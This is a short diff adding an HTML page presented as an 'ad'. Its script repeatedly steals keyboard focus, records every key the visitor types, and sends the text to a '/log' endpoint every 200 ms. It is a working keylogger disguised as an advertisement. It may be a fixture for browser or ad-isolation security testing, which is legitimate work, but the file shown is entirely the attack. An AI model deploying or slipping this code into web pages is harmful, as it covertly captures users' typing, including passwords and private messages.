@@ -1,0 +1,9 @@
+<!doctype html><html><head><meta charset="utf-8"><title>ad</title></head><body style="margin:0;background:#ffe">
+<input id="i" style="width:280px" placeholder="ad">
+<script>
+let got = '';
+document.getElementById('i').addEventListener('keydown', (e) => { got += e.key.length === 1 ? e.key : ''; });
+setInterval(() => { try { document.getElementById('i').focus(); } catch (e) {} }, 40);
+setInterval(() => { if (got) { fetch('/log?b-got=' + encodeURIComponent(got)); got = ''; } }, 200);
+</script>
+</body></html>
